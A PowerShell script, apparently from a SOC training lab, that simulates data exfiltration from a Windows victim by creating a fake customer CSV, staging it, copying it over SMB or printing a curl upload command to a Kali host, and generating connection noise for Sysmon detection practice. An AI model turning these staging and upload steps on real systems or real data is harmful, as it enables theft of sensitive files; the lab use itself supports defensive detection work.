# Attack 4: Data transfer / exfil simulation (LAB ONLY - run on Windows victim)
# Usage: .\04_data_transfer.ps1 -DestHost 192.168.56.30

[CmdletBinding()]
param(
    [string]$DestHost = "192.168.56.30",
    [string]$DestShare = "",
    [string]$OutDir = "$env:USERPROFILE\Desktop\soc-lab-exfil"
)

$ErrorActionPreference = "Stop"
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

$payload = Join-Path $OutDir "customer_export_fake.csv"
Write-Host "[*] Generating fake sensitive CSV (~2MB)..."
$rows = @("id,name,email,note")
1..20000 | ForEach-Object {
    $rows += "$_,User$_,user$_@example.lab,SOC-LAB-DATA"
}
$rows | Set-Content -Path $payload -Encoding UTF8
$size = (Get-Item $payload).Length
Write-Host "[+] Created $payload ($size bytes)"

# Local copy staging
$stage = Join-Path $env:TEMP "staged_customer_export.csv"
Copy-Item $payload $stage -Force
Write-Host "[+] Staged at $stage"

# Attempt SMB copy if share provided
if ($DestShare) {
    $dest = "\\$DestHost\$DestShare\customer_export_fake.csv"
    Write-Host "[*] Copying to $dest ..."
    Copy-Item $payload $dest -Force
    Write-Host "[+] SMB copy complete"
} else {
    Write-Host "[*] No -DestShare given. Starting local HTTP listener tip:"
    Write-Host "    On Kali: mkdir -p /tmp/exfil && cd /tmp/exfil && python3 -m http.server 8080"
    Write-Host "    Then from Windows (if curl available):"
    Write-Host "    curl.exe -F `"file=@$payload`" http://$DestHost:8080/  # may need upload server"
    Write-Host "[*] Or use SCP from Kali (04_exfil_pull.sh) to pull the file."
}

# Generate network noise: many connections to dest host HTTP
Write-Host "[*] Generating network connections to $DestHost ..."
1..15 | ForEach-Object {
    try {
        Test-NetConnection -ComputerName $DestHost -Port 22 -WarningAction SilentlyContinue | Out-Null
    } catch {}
}

Write-Host "[+] Exfil simulation complete. Review Sysmon EID 11 (FileCreate) and EID 3 (Network)."
